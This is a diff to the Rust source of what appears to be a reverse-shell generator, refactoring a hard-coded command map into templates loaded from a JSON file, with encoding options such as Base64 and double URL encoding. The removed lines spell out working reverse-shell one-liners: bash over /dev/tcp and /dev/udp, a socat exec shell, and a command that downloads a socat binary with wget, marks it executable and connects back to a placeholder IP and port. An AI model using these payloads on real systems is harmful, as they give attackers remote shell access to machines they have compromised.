@@ -1,26 +1,40 @@
-use lazy_static::lazy_static;
-
 use std::collections::HashMap;
+use serde::Deserialize;
+use lazy_static::lazy_static;
+use std::fmt;
+
 lazy_static! {
-    pub static ref COMMANDLIST: HashMap<String, String> = {
+    pub static ref SHELLS: HashMap<String, RevShell> = {
         let mut m = HashMap::new();
-        m.insert(
-            "bash_tcp".to_string(),
-            "bash -i >& /dev/tcp/{SUBIP}/{SUBPORT} 0>&1".to_string(),
-        );
-        m.insert(
-            "bash_udp".to_string(),
-            "bash -i >& /dev/udp/{SUBIP}/{SUBPORT} 0>&1".to_string(),
-        );
-        m.insert("socat".to_string(),
-                 "socat file:`tty`,raw,echo=0 TCP-L:{SUBPORT};/tmp/socat exec:\
-                 'bash -li',pty,stderr,setsid,sigint,sane tcp:{SUBIP}:{SUBPORT}"
-                 .to_string());
-        m.insert("socat_wget".to_string(),
-                "wget -q https://github.com/andrew-d/static-binaries\
-                /raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x\
-                /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,\
-                sane tcp:{SUBIP}:{SUBPORT}".to_string());
+        let raw_json = std::include_str!("../revshells.json");
+        let shells: Vec<RevShell> = serde_json::from_str(&raw_json).expect("Failed to parse revshells.json");
+        for shell in shells {
+            m.insert(shell.name.clone(), shell.clone());
+        }
         m
     };
+}
+
+
+#[derive(Deserialize, Debug, Clone)]
+pub struct RevShell {
+    /// The name of the reverse shell
+    pub name: String,
+    /// The shell command that we will modify in this generator
+    pub command: String,
+    /// What Opperating Systems does this reverse shell work on?
+    pub os_support: Vec<String>,
+    /// What values do we need to get from the user, to generate this reverse shell.
+    pub sub_components: Vec<String>,
+}
+
+impl fmt::Display for RevShell {
+    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
+        write!(f, "Name:\t\t{}\nOS:\t\t{:?}\nSubcomponents:\t{:?}\nCommand:\t{}", self.name, self.os_support, self.sub_components, self.command)
+    }
+}
+
+#[derive(Debug, clap::ArgEnum, Clone)]
+pub enum Encoding {
+    None, UrlEncode, DoubleUrlEncode, Base64Encode,
 }
